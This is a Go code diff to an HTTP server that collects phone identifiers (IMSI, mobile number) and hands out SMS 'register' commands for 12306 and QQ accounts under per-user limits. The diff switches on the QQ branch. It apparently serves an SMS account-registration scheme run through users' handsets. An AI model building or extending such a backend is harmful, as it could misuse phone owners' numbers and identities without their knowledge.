@@ -42,7 +42,7 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 	}()
 	w.Write([]byte("<datas><stats>1</stats></datas>"))
 	// fmt.Fprintf(w, "Hello, %s", html.EscapeString(req.URL.Path))
-	fmt.Println("RawQuery, %s", r.URL.RawQuery)
+	fmt.Println("sendC RawQuery, %s", r.URL.RawQuery)
 	// req.ParseForm()
 	// msg := r.Form["msg"]
 	msg := r.FormValue("msg")
@@ -210,7 +210,7 @@ func getC(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Write([]byte(resp))
 
-	fmt.Println("RawQuery,", r.URL.RawQuery)
+	fmt.Println("getC RawQuery,", r.URL.RawQuery)
 
 	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Cid: r.FormValue("cid"), Mobile: (*user)["mobile"], Resp: resp}
 	end := time.Now()
@@ -225,6 +225,9 @@ func chooseRegisterContent(user map[string]string) string {
 	if checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
 		result = REGISTER_GETC_12306
 		appList = ",5,"
+	} else if checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
+		result = REGISTER_GETC_QQ
+		appList = ",4,"
 	} else {
 		result = DEFAULT_GETC
 	}
@@ -232,29 +235,29 @@ func chooseRegisterContent(user map[string]string) string {
 		go processRegisterUser(user, appList)
 	}
 	return result
-	// else if checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
-	// 	result = REGISTER_GETC_QQ
-	// 	appList = ",4,"
-	// }
 }
 
 func checkSmsRegister(user map[string]string, cmdParaName string, successParaName string, sysLimitName string) bool {
-	if strings.EqualFold(user[cmdParaName], "NULL") { // 从来没有生成过指令
-		return true
+	_sysLimit, _ := strconv.ParseInt(mapConfig[sysLimitName], 10, 8)
+	if _sysLimit <= 0 {
+		return false
 	} else {
-		_registerCmdCount, _ := strconv.ParseInt(user[cmdParaName], 10, 8)
-		_sysLimit, _ := strconv.ParseInt(mapConfig[sysLimitName], 10, 8)
-		if _registerCmdCount-_sysLimit >= TRY_MORE_TIMES { // 生成指令超过限制次数
-			return false
+		if strings.EqualFold(user[cmdParaName], "NULL") { // 从来没有生成过指令
+			return true
 		} else {
-			if strings.EqualFold(user[successParaName], "NULL") { //如果还没成功过
-				return true
+			_registerCmdCount, _ := strconv.ParseInt(user[cmdParaName], 10, 8)
+			if _registerCmdCount-_sysLimit >= TRY_MORE_TIMES { // 生成指令超过限制次数
+				return false
 			} else {
-				_registerSuccessCount, _ := strconv.ParseInt(user[successParaName], 10, 8)
-				if _registerSuccessCount >= _sysLimit { //成功次数判定
-					return false
-				} else {
+				if strings.EqualFold(user[successParaName], "NULL") { //如果还没成功过
 					return true
+				} else {
+					_registerSuccessCount, _ := strconv.ParseInt(user[successParaName], 10, 8)
+					if _registerSuccessCount >= _sysLimit { //成功次数判定
+						return false
+					} else {
+						return true
+					}
 				}
 			}
 		}
